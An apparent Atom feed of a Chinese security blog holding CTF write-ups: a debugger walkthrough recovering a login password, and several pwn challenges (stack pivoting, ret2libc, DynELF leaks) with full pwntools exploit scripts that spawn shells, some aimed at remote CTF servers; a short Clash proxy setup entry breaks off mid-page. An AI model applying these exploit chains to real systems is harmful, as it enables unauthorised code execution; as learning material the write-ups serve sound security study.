<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chumen77&#39;s Blog</title>
  
  <subtitle>永远相信美好的事情即将发生！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chumen77.xyz/"/>
  <updated>2020-02-28T07:55:29.000Z</updated>
  <id>http://chumen77.xyz/</id>
  
  <author>
    <name>chumen77</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记录i春秋新春公益赛的两个题</title>
    <link href="http://chumen77.xyz/2020/02/25/%E8%AE%B0%E5%BD%95i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%A2%98/"/>
    <id>http://chumen77.xyz/2020/02/25/记录i春秋新春公益赛的两个题/</id>
    <published>2020-02-25T08:55:25.000Z</published>
    <updated>2020-02-28T07:55:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记录i春秋新春公益赛的两个题"><a href="#记录i春秋新春公益赛的两个题" class="headerlink" title="记录i春秋新春公益赛的两个题"></a>记录i春秋新春公益赛的两个题</h1><h2 id="吃鸡神器"><a href="#吃鸡神器" class="headerlink" title="吃鸡神器"></a>吃鸡神器</h2><p>这个题目是比赛时没做，因为有一段时间没做re题目了，下来看到这个题做出的人不算少，就去尝试做一做。<br>源程序是qt写的，以前听室友说过qt的程序ida是静态分析不了的，函数调用太多了，就直接动态分析。这个题目应该是有多线程od打开直接是黑屏的，左下角显示新建了一个线程，第一次做这种题也比较没有头绪。折腾了一会发现用的<strong>x64dbg</strong>可以调试了。</p><h3 id="x64dbg调试"><a href="#x64dbg调试" class="headerlink" title="x64dbg调试"></a>x64dbg调试</h3><p>一直运行程序等代码跑到0x40开头的段，进入login 的模块。<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/aQ0jsg.png" srcset="/img/loading.gif" alt><br>找下字符串：<br>￼<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/AL01Oy.png" srcset="/img/loading.gif" alt><br>在这里下个断点。因为登陆失败会跳转输出这个字符串的函数，看看能不能查看出是从哪里跳转过来的然后在密码判断那里来继续分析。<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/Ior8oA.png" srcset="/img/loading.gif" alt><br>看到已经跳转过来了，但是发现附近没有什么判断的地方，去根据那个从哪里跳转过来，追过去看到登陆成功调用welcome的函数，但是也没有发现什么可以利用的那里的判断不是要找的密码判断。<br>换个思路，还是跳转到失败那里，但是在<strong>上层函数</strong>的栈中，因为存在判断登陆的用户跟密码，应该会存在我们输入的东西，寻找一下密码跟用户名。<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/ExvIk2.png" srcset="/img/loading.gif" alt><br>找到了，给用户名对应的地址下一个硬件断点，来看看哪里会访问这里，只要访问了基本距离要找的函数差不远了。其中第二个字符对应处，经测试不应该下断点。一直让其F9运行，等到了用户0x40段代码：<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/guzN1A.png" srcset="/img/loading.gif" alt><br>发现这段是在一个个字符处理<strong>lubenwei</strong>字符串，还有<code>ret</code>，这样基本就是了。ret以后到：<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/nTZ8tn.png" srcset="/img/loading.gif" alt><br>注意此处的汇编语句，并看下寄存器情况：</p><p><img src="http://q5j29gptn.bkt.clouddn.com/uPic/bua46M.png" srcset="/img/loading.gif" alt><br>刚刚走过call函数，下面且有cmp对比语句，并且发现了输入的密码<code>12345678</code>，十分可疑了。<br>在这几处函数下断点，重新点击login验证进行分析，发现的确断在了下的这几个函数，结合寄存器查看发现，输入的密码跟走过<code>0x004021D3</code>这个函数后传过来的eax进行对比。并且一对比以后就进入了，提示登陆失败的地方。所以这个eax就是用户的密码了。<br>测试以后发现是小写的<code>eax  41D26F00</code> ：41d26f00,输入密码：<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/psY0ix.png" srcset="/img/loading.gif" alt><br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/r3WZrp.png" srcset="/img/loading.gif" alt><br>Ok,成功了。</p><h2 id="borrowstack"><a href="#borrowstack" class="headerlink" title="borrowstack"></a>borrowstack</h2><p>这个题目名字就是borrowshack 接栈。含义就是转移栈，正好最近刚学过，就动手去做了，结果卡了很久，但也学到很多，此前练习的栈迁移题目没有这题的情况。</p><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code class="objc">[*] &#39;/media/psf/mypwn2/xcgys/borrowstack&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [rsp+0h] [rbp-60h]  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  puts(&amp;s);  read(0, &amp;buf, 0x70uLL);  puts(&quot;Done!You can check and use your borrow stack now!&quot;);  read(0, &amp;bank, 0x100uLL);  return 0;}</code></pre><p>代码是很简单的，bank的地址在bss段，以后留着做栈迁移就可以了 。溢出地址还是只可以控制ebp，跟retadress。接下来就是自己学到的了，自己手动调试了一段时间才发现的。</p><h4 id="坑点（学到的新东西）"><a href="#坑点（学到的新东西）" class="headerlink" title="坑点（学到的新东西）"></a>坑点（学到的新东西）</h4><p>先说下这个程序的情况：<br>bank 的地址 <code>.bss:0000000000601080</code><br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/Q3hjpz.png" srcset="/img/loading.gif" alt><br>注意看下bss段里got段的距离，一共是40个字节，是比较近的。如果按我以前的做法直接迁移到bank这地址做新栈，当栈迁移过去以后，使用puts函数来泄露某个函数got对应的地址时，会发现当调用puts以后，会进入libc中开始一连串的函数调用：第一个<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/2Zk09z.png" srcset="/img/loading.gif" alt><br>发现还没有push，此时rsp就是bank的地址了，push过后肯定栈指针开始慢慢变小，往bss段上方延伸。<br>当调用第二个函数：<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/v02DA7.png" srcset="/img/loading.gif" alt><br>发现已经到了bss上方的got表段，这样毫无疑问，里面的值就会改动了，程序接下来发生什么是很难预测的，并且个人也拿不到原本的got地址，从而算出libc基地址。并且会发现，当以往回到start处清理栈想再次利用漏洞的时候，也是不行了，也是因为不知道什么数据被改动，造成了影响。</p><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><p>就是把栈迁移到bss段的尽量靠后，这样就会尽量不影响到got表和原本正常的数据。返回地址不再是自己常常用的start处，换成其他合适的地方。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./borrowstack&#39;)# io = remote(&#39;123.56.85.29&#39;,3635)elf = ELF(&#39;./borrowstack&#39;)# libc = elf.libcleave_addr = 0x0400699offset = 200buf_addr = 0x000601080padding = 0x60start_addr = 0x0400626p = &#39;\x00&#39;* padding + p64(buf_addr+offset) + p64(leave_addr)pop_rsi_rx_ret = 0x400701 io.recvuntil(&#39;want\n&#39;)raw_input(&#39;-&gt;&#39;)io.send(p)io.recvuntil(&#39;stack now!\n&#39;)libc_start_main =  elf.got[&#39;__libc_start_main&#39;]puts_plt = elf.symbols[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]pop_rdi_ret = 0x400703read_got = elf.got[&#39;read&#39;]p = flat([&#39;b&#39;*offset,(buf_addr+offset),pop_rdi_ret,puts_got,puts_plt,start_addr])raw_input(&#39;-&gt;&#39;)io.sendline(p)puts_add = u64((io.recv(6)).ljust(8,&#39;\x00&#39;))print(hex(puts_add))obj = LibcSearcher(&#39;puts&#39;,puts_add)libc_base = puts_add - obj.dump(&#39;puts&#39;)print(hex(libc_base))sleep(0.1)rec = libc_base + 0x4526asystem_addr = libc_base + libc_basebinsh_addr = libc_base + libc_baseprint(hex(system_addr))print(hex(binsh_addr))io.recvline()io.recvuntil(&#39;want\n&#39;)p = &#39;\x00&#39;* padding + p64(1) + p64(rec)io.send(p)io.interactive()</code></pre><h3 id="结论和收获"><a href="#结论和收获" class="headerlink" title="结论和收获"></a>结论和收获</h3><p>结论：当栈迁移到bss段以后，由于libc函数的调用，此时栈慢慢增高，bss段以上的数据也可能会被改动。<br>收获：当再遇到栈迁移问题的时候，要注意bss段与got的距离，返回地址写入start地址，发现出现问题的时候，就该提升栈迁移的地址高度，和找个合适的返回位置，再次利用漏洞。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;记录i春秋新春公益赛的两个题&quot;&gt;&lt;a href=&quot;#记录i春秋新春公益赛的两个题&quot; class=&quot;headerlink&quot; title=&quot;记录i春秋新春公益赛的两个题&quot;&gt;&lt;/a&gt;记录i春秋新春公益赛的两个题&lt;/h1&gt;&lt;h2 id=&quot;吃鸡神器&quot;&gt;&lt;a href=&quot;#吃
      
    
    </summary>
    
    
      <category term="WP" scheme="http://chumen77.xyz/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>XCTF\_pwn新手</title>
    <link href="http://chumen77.xyz/2020/02/17/XCTF_pwn%E6%96%B0%E6%89%8B/"/>
    <id>http://chumen77.xyz/2020/02/17/XCTF_pwn新手/</id>
    <published>2020-02-17T12:42:23.000Z</published>
    <updated>2020-02-28T09:12:25.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-pwn新手"><a href="#XCTF-pwn新手" class="headerlink" title="XCTF_pwn新手"></a>XCTF_pwn新手</h1><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code class="objc">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/17/XCTF_pwn新手/images/15819436335898.jpg" srcset="/img/loading.gif" alt="-w605"><br>漏洞就在这s处，gets可以无限读取，导致栈溢出。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>第一个fgets获取时候，读取一个<code>/bin/sh\x00</code>进去，因为name的地址是固定的。</li><li>get函数获取时候，padding + system_plt +name地址即可。</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;# io = process(&#39;./cgpwn2&#39;)io = remote(&#39;111.198.29.45&#39;,40540)elf = ELF(&#39;./cgpwn2&#39;)io.recvuntil(&#39;name\n&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(&#39;/bin/sh\x00&#39;)system_plt = elf.symbols[&#39;system&#39;]padding = 0x26 + 4binsh_add = 0x0804A080payload = padding * &#39;a&#39; + p32(system_plt) + p32(0x0804A080) + p32(binsh_add)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XCTF-pwn新手&quot;&gt;&lt;a href=&quot;#XCTF-pwn新手&quot; class=&quot;headerlink&quot; title=&quot;XCTF_pwn新手&quot;&gt;&lt;/a&gt;XCTF_pwn新手&lt;/h1&gt;&lt;h2 id=&quot;cgpwn2&quot;&gt;&lt;a href=&quot;#cgpwn2&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="WP" scheme="http://chumen77.xyz/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>利用DynElf模块完成获取libc信息</title>
    <link href="http://chumen77.xyz/2020/02/15/%E5%88%A9%E7%94%A8DynElf%E6%A8%A1%E5%9D%97%E5%AE%8C%E6%88%90%E8%8E%B7%E5%8F%96libc%E4%BF%A1%E6%81%AF/"/>
    <id>http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/</id>
    <published>2020-02-15T08:54:53.000Z</published>
    <updated>2020-02-28T07:49:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用DynElf模块完成获取libc信息"><a href="#利用DynElf模块完成获取libc信息" class="headerlink" title="利用DynElf模块完成获取libc信息"></a>利用DynElf模块完成获取libc信息</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下另一种没有libc，完成漏洞利用的办法，学完后自我感觉这个办法已经比较落后了，没有libcseacher好用，也用起来比它难的多了。针对于libcseacher不能做的题，用这种办法，否则还是libcseacher好用。</p><h2 id="Dynelf"><a href="#Dynelf" class="headerlink" title="Dynelf"></a>Dynelf</h2><p>解析加载的、动态链接的ELF⼆进制⽂件中的符号。给定⼀个可以在任意地址泄漏数据的函数，任何加载的 库中的任何符号都可以被解析。（官方文档解释）</p><h3 id="基本使用框架："><a href="#基本使用框架：" class="headerlink" title="基本使用框架："></a>基本使用框架：</h3><pre><code>io = remote(ip, port)def leak(addr):    payload = &quot;xxxxxxxx&quot; + addr + &quot;xxxxxxxx&quot;    io.send(payload)    data = io.recv()    #debug用的    print(&quot;%x -&gt; %s&quot; %(addr, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return data#初始化DynELF模块 d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)system_addr = d.lookup(“system”, &#39;libc&#39;)</code></pre><p>其中第2个参数，可以不传。进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，addr就是leak函数要泄漏信息的所在地址。<strong>正是这个addr的参数的存在，才让Dynelf函数在内存中到处的leak以及对比是否是我们寻找的sympols</strong>。</p><p>且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几 个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等。</p><h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</p><ul><li>目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；</li><li>目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</li></ul><p>以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</p><h3 id="使用write函数来泄露"><a href="#使用write函数来泄露" class="headerlink" title="使用write函数来泄露"></a>使用write函数来泄露</h3><p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。</p><p>其输出完全由其参数len决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响。因此leak函数中对数据的读取和处理较为简单。但是其一个不好的地方，就是需要传递3个参数，在面对64位程序的时候，其中rdx这个寄存器是比较难处理的。就不得不用万能gadget了。</p><h4 id="万能gadget"><a href="#万能gadget" class="headerlink" title="万能gadget"></a>万能gadget</h4><p><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817628590359.jpg" srcset="/img/loading.gif" alt="-w817"><br>这个是libc_init函数的汇编，这个函数是一定要调用的，并且可以控制rdi,rsi,rdx,所以能称的上万能gadget。对于使用这段gadget，首先在初识函数的ret处填入如图所指的<code>pop rbx</code>的地址，然后看下栈如何来布置：<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817631112375.jpg" srcset="/img/loading.gif" alt="-w486"><br>（其中为什么填入got地址，是因为接下来ret到<code>mov rdx,r13</code>后面的call qword ptr[r12+rbx*8] 其是call这个地址的。）<br>在第一段pop 后ret地址要填入<code>mov rdx,r13</code>的地址，然后再慢慢执行，当执行完成call以后，流程还会回到这一段<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817633402017.jpg" srcset="/img/loading.gif" alt="-w259"><br>所以我们为了再次利用最后那个retn，ret到自己想去的地方，要在栈上摆好7*8=56个字节。接下来练习关于write两个题目。</p><h4 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013 ropasaurusrex"></a>PlaidCTF 2013 ropasaurusrex</h4><h5 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>   Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code>ssize_t sub_80483F4(){  char buf; // [esp+10h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre><p>函数十分简单，溢出在这个位置。并且plt里面有write函数，然后就用它来泄露。</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code>from pwn import *io = process(&#39;./ropasaurusrex&#39;)elf = ELF(&#39;./ropasaurusrex&#39;)buf = 0x8049620padding = 140write_add = elf.symbols[&#39;write&#39;]start_addr = 0x08048340def leak(addr):    p = &#39;&#39;    p += padding * &#39;a&#39;    p += p32(write_add)    p += p32(start_addr)    p += p32(1)    p += p32(addr)    p += p32(0x4)    io.sendline(p)    content = io.recv(4)    # print(&quot;%x -&gt; %s&quot; %(addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))    return contentd = DynELF(leak,elf=elf)system_add = d.lookup(&#39;system&#39;,&#39;libc&#39;)read_add = d.lookup(&#39;read&#39;,&#39;libc&#39;)log.info(&quot;system_add = %x&quot;, system_add)log.info(&quot;read_add = %x&quot;, read_add)p = padding * &#39;a&#39; + p32(read_add) + p32(system_add) + p32(0) + p32(buf) + p32(8)io.sendline(p)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h4 id="Jarvis-oj-leave4"><a href="#Jarvis-oj-leave4" class="headerlink" title="Jarvis_oj_leave4"></a>Jarvis_oj_leave4</h4><h5 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>[*] &#39;/media/psf/mypwn2/jarvis_OJ/level4/level4&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817716059093.jpg" srcset="/img/loading.gif" alt="-w420"></p><pre><code>ssize_t vulnerable_function(){  char buf; // [esp+0h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre><p>漏洞函数，存在栈溢出。还是跟上题一样的思路。</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code>from pwn import *import time# context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./level4&#39;)io = remote(&#39;pwn2.jarvisoj.com&#39;,9880)elf = ELF(&#39;./level4&#39;)__libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]write_plt = elf.symbols[&#39;write&#39;]start_addr = 0x08048350padding = 140def leak(addr):    payload = padding * &#39;a&#39; + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) +p32(0x4)    io.sendline(payload)    data = io.recv(4)    print(&quot;%x -&gt; %s&quot; %(addr, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datad = DynELF(leak,elf = elf)system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;)info(&#39;system_addr = %#x&#39; %system_addr)read_addr = d.lookup(&#39;read&#39;,&#39;libc&#39;)info(&#39;read_addr = %#x&#39; %read_addr)binsh_add = 0x804A01Cpayload = padding * &#39;a&#39; + p32(read_addr) + p32(system_addr) + p32(0) + p32(binsh_add) + p32(8)io.sendline(payload)sleep(0.1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="使用puts函数来泄露"><a href="#使用puts函数来泄露" class="headerlink" title="使用puts函数来泄露"></a>使用puts函数来泄露</h3><p>printf, puts这类函数的特点是会被特殊字符影响，puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，<strong>puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点</strong>，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</p><h4 id="针对缺点的改进办法"><a href="#针对缺点的改进办法" class="headerlink" title="针对缺点的改进办法"></a>针对缺点的改进办法</h4><h5 id="puts输出完后就没有其他输出"><a href="#puts输出完后就没有其他输出" class="headerlink" title="puts输出完后就没有其他输出"></a>puts输出完后就没有其他输出</h5><p>leak函数模板<br>    def leak(address):<br>      count = 0<br>      content = ‘’<br>      payload = xxx<br>      p.send(payload)<br>      print p.recvuntil(‘xxxn’) #一定要在puts前释放完输出<br>      up = “”<br>      while True:<br>        c = p.recv(numb=1, timeout=0.1)<br>        count += 1<br>        if up == ‘\n’ and c == “”:  #接收到的上一个字符为回车符，而当前接收不到新字符，则<br>         content += content[:-1]  +’\x00’            #删除puts函数输出的末尾回车符<br>          break<br>        else:<br>          content += c<br>        up = c<br>      content = content[:4]  #取指定字节数<br>      log.info(“%#x =&gt; %s” % (address, (content or ‘’).encode(‘hex’)))<br>      return content<br>其中<code>c = p.recv(numb=1, timeout=0.1)</code>由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待0.1秒钟，如果确实接收不到了，就说明输出结束了。以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</p><h5 id="puts输出完后还有其他输出"><a href="#puts输出完后还有其他输出" class="headerlink" title="puts输出完后还有其他输出"></a>puts输出完后还有其他输出</h5><pre><code>def leak(address):  count = 0  content = &quot;&quot;  payload = xxx  p.send(payload)  print p.recvuntil(&quot;xxxn&quot;)) #一定要在puts前释放完输出  up = &quot;&quot;  while True:    c = p.recv(1)    count += 1    if up == &#39;\n&#39; and c == &quot;x&quot;:  #一定要找到泄漏信息的字符串特征      content = content[:-1] + &quot;x00&quot;                        break    else:      content += c    up = c  content = content[:4]   log.info(&quot;%#x =&gt; %s&quot; % (address, (content or &#39;&#39;).encode(&#39;hex&#39;)))  return content</code></pre><h4 id="Lctf-2016-pwn100"><a href="#Lctf-2016-pwn100" class="headerlink" title="Lctf_2016_pwn100"></a>Lctf_2016_pwn100</h4><h5 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h5><pre><code>[*] &#39;/media/psf/mypwn2/ichunqiu/0x05/LCTF 2016-pwn100/pwn100&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code>int sub_40068E(){  char v1; // [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;v1, 200);  return puts(&quot;bye~&quot;);}__int64 __fastcall sub_40063D(__int64 a1, signed int a2){  __int64 result; // rax  signed int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; ; ++i )  {    result = (unsigned int)i;    if ( i &gt;= a2 )      break;    read(0, (void *)(i + a1), 1uLL);  }  return result;}</code></pre><p>主要的漏洞函数在这两个。这二个函数结合起来引起栈溢出，第二个函数还对读入数据做了处理，我们要保证送过去200的个自己，注意要用send发。</p><ol><li>因为其有puts函数，这次就用puts函数来进行leak。等leak出来以后，返回start清理栈，再用dynelf找出system，和read函数的地址。</li><li>第二次构造rop链的时候，用read函数读<code>system(/bin/sh)</code>到一个确定的地址，还是会到start处。</li><li>第三次构造时候，直接进行调用system函数的rop链即可。</li></ol><p>其中对于read这个函数，rdx这个参数就得用万能gadget来控制了。<br><img src="/2020/02/15/利用DynElf模块完成获取libc信息/images/15817725422726.jpg" srcset="/img/loading.gif" alt="-w820"></p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code>#coding:utf-8from pwn import *context.arch = &#39;amd64&#39;# context.log_level = &#39;info&#39;io = process(&#39;./pwn100&#39;)elf = ELF(&#39;./pwn100&#39;)# libc = elf.libcpadding = 72puts_plt = elf.plt[&#39;puts&#39;]read_got = elf.got[&#39;read&#39;]start_add = 0x000400550pop_rdi = 0x400763def leak(addr):    payload = padding * &#39;a&#39; + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_add)#flat[(pop_rdi,addr,puts_plt,start_add)]    payload = payload.ljust(200,&#39;b&#39;)    io.send(payload)    count = 0    up = &#39;&#39;    content = &#39;&#39;    io.recvuntil(&#39;bye~\n&#39;) #一定要在puts前释放完输出    while True:        c = io.recv(numb=1, timeout=0.1)        count += 1        if up == &#39;\n&#39; and c == &quot;&quot;:  #接收到的上一个字符为回车符，而当前接收不到新字符，则            content = content[:-1]  +&#39;\x00&#39;             #删除puts函数输出的末尾回车符            break            content += c        else:            up = c    content = content[:4]  #取指定字节数    log.info(&quot;%#x =&gt; %s&quot; % (addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))    return contentd = DynELF(leak, elf = elf)system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;)log.info(&#39;system_addr = %#x&#39; %system_addr)binsh_addr = 0x601068 - 8payload = padding * &#39;a&#39; + flat([0x0040075A,0,1,read_got,8,binsh_addr,0,0x00400740,&#39;\x00&#39;*56,start_add])payload = payload.ljust(200,&#39;b&#39;)io.send(payload)io.recvuntil(&#39;bye~\n&#39;)io.send(&#39;/bin/sh\x00&#39;)payload = padding * &#39;a&#39; + flat([pop_rdi,binsh_addr,system_addr])payload = payload.ljust(200,&#39;b&#39;)io.send(payload)io.interactive()</code></pre><h3 id="其他获取libc的方法"><a href="#其他获取libc的方法" class="headerlink" title="其他获取libc的方法"></a>其他获取libc的方法</h3><p>虽然DynELF是一个dump利器，但是如果写不出来leak函数，下libc被墙等等。就用这两个网站：<br><a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a><br><a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a><br>都是只有有两个泄露地址，就可以查到对应的libc版本，并且可以给出其原件，接着就可以进行其他操作。</p><p>还有在比赛过程中，如果一个题目不好获取到libc，那么可以看看其他题目的libc，有可能这个赛事平台服务器都是这个版本。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;利用DynElf模块完成获取libc信息&quot;&gt;&lt;a href=&quot;#利用DynElf模块完成获取libc信息&quot; class=&quot;headerlink&quot; title=&quot;利用DynElf模块完成获取libc信息&quot;&gt;&lt;/a&gt;利用DynElf模块完成获取libc信息&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>linux下clash的使用</title>
    <link href="http://chumen77.xyz/2020/02/14/linux%E4%B8%8Bclash%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://chumen77.xyz/2020/02/14/linux下clash的使用/</id>
    <published>2020-02-14T15:27:09.000Z</published>
    <updated>2020-02-28T07:49:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux下clash的使用"><a href="#linux下clash的使用" class="headerlink" title="linux下clash的使用"></a>linux下clash的使用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文只是很简单记录一下，自己如何使用clash的。因为发现终端虽说在本机上已经开了代理，但是终端执行命令下载东西的时候十分的卡，今天才了解到，原来终端的代理是另外开的。所以就开始折腾一下，linux下clash的使用（本人用了很久了clash，所以直接看这个软件了）。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>执行<code>cd &amp;&amp; mkdir clash</code> 在用户目录下创建 clash 文件夹。<br>下载适合的 Clash 二进制文件并解压重命名为 clash,一般个人的64位电脑下载 clash-linux-amd64.tar.gz 即可。<br>地址：<a href="https://github.com/Dreamacro/clash/releases" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/releases</a></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>在终端cd到Clash二进制文件所在的目录,把Clash 配置文件给移进去。配置文件的名称要是config.yaml<br><img src="/2020/02/14/linux下clash的使用/images/15816946080116.jpg" srcset="/img/loading.gif" alt="-w286"></p><p>我是直接创建了这个文件，并写入的自己的配置，因为mac本机一直用这个软件，然后在配置文件找到主使用那个，直接复制那个自己使用代理网站加载下来的配置给config.yaml。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><code>chmod +x ./clash</code>加执行权限<br>执行 ./clash -d . 即可启动 Clash，同时启动 HTTP 代理和 Socks5 代理。<br>然后进入这个<a href="http://clash.razord.top/" target="_blank" rel="noopener">http://clash.razord.top/</a> 链接可以对代理进行个简单管理<br><img 